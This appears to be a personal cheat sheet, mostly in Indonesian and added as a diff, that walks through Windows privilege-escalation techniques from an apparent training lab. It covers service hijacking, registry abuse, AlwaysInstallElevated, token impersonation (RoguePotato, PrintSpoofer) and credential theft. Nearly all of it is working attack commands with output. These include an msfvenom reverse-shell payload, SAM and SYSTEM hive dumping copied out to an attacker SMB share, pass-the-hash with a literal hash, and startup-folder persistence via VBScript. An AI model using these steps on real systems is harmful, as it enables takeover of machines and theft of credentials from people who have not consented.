@@ -1,0 +1,243 @@
+``` Service Exploits - Insecure Service Permission
+
+Note: harus udah ada revsh.exe di target
+
+1. `C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc`
+	RW daclsvc                                                                                                                                   SERVICE_QUERY_STATUS                                                                                                                 SERVICE_QUERY_CONFIG                                                                                                                 SERVICE_CHANGE_CONFIG                                                                                                                SERVICE_INTERROGATE                                                                                                                  SERVICE_ENUMERATE_DEPENDENTS                                                                                                         SERVICE_START                                                                                                                        SERVICE_STOP                                                                                                                         READ_CONTROL
+2. `sc qc daclsvc`
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: daclsvc
+        	TYPE               : 10  WIN32_OWN_PROCESS
+        	START_TYPE         : 3   DEMAND_START
+        	ERROR_CONTROL      : 1   NORMAL
+        	BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
+        	LOAD_ORDER_GROUP   :
+        	TAG                : 0
+        	DISPLAY_NAME       : DACL Service
+        	DEPENDENCIES       :
+        	SERVICE_START_NAME : LocalSystem
+3. `sc config daclsvc binpath= "\"C:\path\to\revsh.exe\""`
+	[SC] ChangeServiceConfig SUCCESS
+4. start listener, dan execute revsh dengan cara `net start daclsvc`
+```
+
+``` Service Exploits - Unquoted Service Path
+
+1. `sc qc unqiotedsvc`
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: unquotedsvc
+        	TYPE               : 10  WIN32_OWN_PROCESS
+        	START_TYPE         : 3   DEMAND_START
+        	ERROR_CONTROL      : 1   NORMAL
+        	BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+        	LOAD_ORDER_GROUP   :
+        	TAG                : 0
+        	DISPLAY_NAME       : Unquoted Path Service
+        	DEPENDENCIES       :
+        	SERVICE_START_NAME : LocalSystem
+2. `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
+	Medium Mandatory Level (Default) [No-Write-Up]
+  	RW BUILTIN\Users
+  	RW NT SERVICE\TrustedInstaller
+  	RW NT AUTHORITY\SYSTEM
+  	RW BUILTIN\Administrators
+3. `copy C:\path\to\revsh.exe "C:\Program Files\path\to\unquoted service\Common.exe"`
+4. start listener, and start the unquoted service using `net start unquotedsvc`
+```
+
+``` Service Exploits - Weak Registry Permissions
+
+1. `sc qc regsvc`
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: regsvc
+        	TYPE               : 10  WIN32_OWN_PROCESS
+        	START_TYPE         : 3   DEMAND_START
+        	ERROR_CONTROL      : 1   NORMAL
+        	BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
+        	LOAD_ORDER_GROUP   :
+        	TAG                : 0
+        	DISPLAY_NAME       : Insecure Registry Service
+        	DEPENDENCIES       :
+        	SERVICE_START_NAME : LocalSystem
+2. `C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
+	HKLM\System\CurrentControlSet\Services\regsvc
+  	Medium Mandatory Level (Default) [No-Write-Up]
+  	RW NT AUTHORITY\SYSTEM
+        	KEY_ALL_ACCESS
+  	RW BUILTIN\Administrators
+        	KEY_ALL_ACCESS
+  	RW NT AUTHORITY\INTERACTIVE
+        	KEY_ALL_ACCESS
+3. `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\path\to\revsh.exe /f`
+4. start listener dan start service dengan `net start regsvc`
+```
+
+``` Service Exploits - Insecure Service Executables
+
+1. `sc qc filepermsvc`
+	[SC] QueryServiceConfig SUCCESS
+
+	SERVICE_NAME: filepermsvc
+        	TYPE               : 10  WIN32_OWN_PROCESS
+        	START_TYPE         : 3   DEMAND_START
+        	ERROR_CONTROL      : 1   NORMAL
+        	BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
+        	LOAD_ORDER_GROUP   :
+        	TAG                : 0
+        	DISPLAY_NAME       : File Permissions Service
+        	DEPENDENCIES       :
+        	SERVICE_START_NAME : LocalSystem
+2. `C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"`
+	Medium Mandatory Level (Default) [No-Write-Up]
+  	RW Everyone
+        	FILE_ALL_ACCESS
+  	RW NT AUTHORITY\SYSTEM
+        	FILE_ALL_ACCESS
+  	RW BUILTIN\Administrators
+        	FILE_ALL_ACCESS
+  	RW WIN-QBA94KB3IOF\Administrator
+        	FILE_ALL_ACCESS
+  	RW BUILTIN\Users
+        	FILE_ALL_ACCESS 
+3. `C:\PrivEsc\path\to\revsh.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y`
+4. start listener dan start service menggunakan `net start filepermsvc`
+```
+
+``` Registry - AutoRuns
+
+1. `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
+	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    		SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
+    		My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
+2. `C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"`
+	C:\Program Files\Autorun Program\program.exe
+  	  Medium Mandatory Level (Default) [No-Write-Up]
+  		RW Everyone
+          FILE_ALL_ACCESS
+  		RW NT AUTHORITY\SYSTEM
+          FILE_ALL_ACCESS
+  		RW BUILTIN\Administrators
+          FILE_ALL_ACCESS
+  		RW WIN-QBA94KB3IOF\Administrator
+          FILE_ALL_ACCESS
+  		RW BUILTIN\Users
+          FILE_ALL_ACCESS
+3. `copy C:\PrivEsc\path\to\revsh.exe "C:\Program Files\Autorun Program\program.exe" /Y`
+4. start listener, lalu restart RDP session agar revsh ter-trigger dan run dengan admin privs. Dalam realworld, administrator harus login dulu agar ketrigger.
+5. bisa pake `rdesktop IP`
+```
+
+``` Registry - AlwaysInstallElevated
+
+1. `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+
+	HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
+    		AlwaysInstallElevated    REG_DWORD    0x1
+2. `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+	HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+    		AlwaysInstallElevated    REG_DWORD    0x1
+3. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=2233 -f msi -o revsh.msi`
+4. `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
+5. `copy \\10.8.14.58\kali\revsh.msi C:\PrivEsc\revsh.msi`
+6. start listener dan run command berikut `msiexec /quiet /qn /i C:\PrivEsc\revsh.msi`
+```
+
+``` Passwords - Registry
+
+Note: untuk beberapa alasan password terkadang tidak stored di registry
+
+1. `reg query HKLM /f password /t REG_SZ /s`
+2. `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"`
+3. `reg query "HKCU\Software\<nama user>\PuTTY\Sessions" /s
+4. `.\winPEASany.exe quiet filesinfo userinfo`
+```
+
+``` Passwords - Saved Creds
+
+1. `cmdkey /list`
+	Currently stored credentials:
+
+    		Target: WindowsLive:target=virtualapp/didlogical
+    		Type: Generic
+    		User: 02nfpgrklkitqatu
+    		Local machine persistence
+
+    		Target: Domain:interactive=WIN-QBA94KB3IOF\admin
+    		Type: Domain Password
+    		User: WIN-QBA94KB3IOF\admin
+2. start listener dan jalankan perintah `runas /savecred /user:admin C:\Privesc\path\to\revsh.exe`
+```
+
+``` Passwords - Security Account Manager (SAM)
+
+Note: kalo mau save SAM dan SYSTEM
+`
+reg save hklm\sam C:\Windows\temp\SAM
+reg save hklm\system C:\Windows\temp\SYSTEM
+`
+
+1. `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .` [di kali]
+2. `copy C:\Windows\path\to\SYSTEM \\10.8.14.58\kali\` dan `copy C:\Windows\Repair\SAM \\10.8.14.58\kali\` [di windows]
+3. `impacket-secretsdump -sam SAM -system SYSTEM local` [di kali]
+```
+
+``` Passwords - Passing the Hash
+
+1. `pth-winexe -U 'admin%hash' //IP-target cmd.exe`
+2. `evil-winrm -i 10.10.183.76 -u admin -H a9fdfa038c4b75ebc76dc855dd74f0da`
+```
+
+``` Scheduled Tasks
+
+Note: seperti scheduled task di linux, coba cek apakah bisa edit file yg menjadi scheduled task nya.
+
+1. `type C:\DevTools\CleanUp.ps1`
+2. `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
+3. `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
+```
+
+``` Insecure GUI Apps
+
+1. di GUI apps, klik `File` lalu pilih `Open`, pada bagian extensi file, coba pilih `All Files`
+2. pada navbox, masukkan dir untuk cmd.exe yaitu `file://c:/windows/system32/cmd.exe` dan enter/ok
+```
+
+``` Startup Apps
+
+Note: tetap butuh creds untuk admin
+
+1. gunakan script berikut dan simpan `createShortcut.vbs`
+`
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\PrivEsc\reverse.exe"
+oLink.Save
+`
+2. `cscript C:\PrivEsc\CreateShortcut.vbs`
+3. start listener, lalu simulate admin logon `rdesktop -u admin IP-target`
+````
+
+``` Token Impersonation - Rogue Potato
+
+Note: perlu privilege `SeImpersonatePrivilege` dan/atau `SeAssignPrimaryTokenPrivilege` untuk melakukan ini. Bisa cek menggunakan `whoami /priv`
+
+1. setup socat untuk redirector di kali, forward Kali port 135 ke 9999 di windows. `sudo socat tcp-listen:135,reuseaddr,fork tcp:IP-target:9999`
+2. start listener di kali. Buka shell sebagai administrator di windows target.
+3. `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\path\to\reverse.exe`
+4. buka listener dengan port yang sama lagi.
+5. selanjutnya pakai rogue potato `C:\PrivEsc\RoguePotato.exe -r IP-local -e "C:\PrivEsc\path\to\reverse.exe" -l`
+6. di listener baru kita akan mendapat "nt authority system".
+```
+
+``` Token Impersonation - PrintSpoofer
+
+1. start listener di kali. Buka shell sebagai administrator di windows target.
+2. `C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\path\to\reverse.exe`
+3. buka listener baru dengan port yg sama
+4. jalankan `C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i` pada revsh yang sudah didapat sebelumnya
+5. akan dapat shell session baru di listener baru.
+```
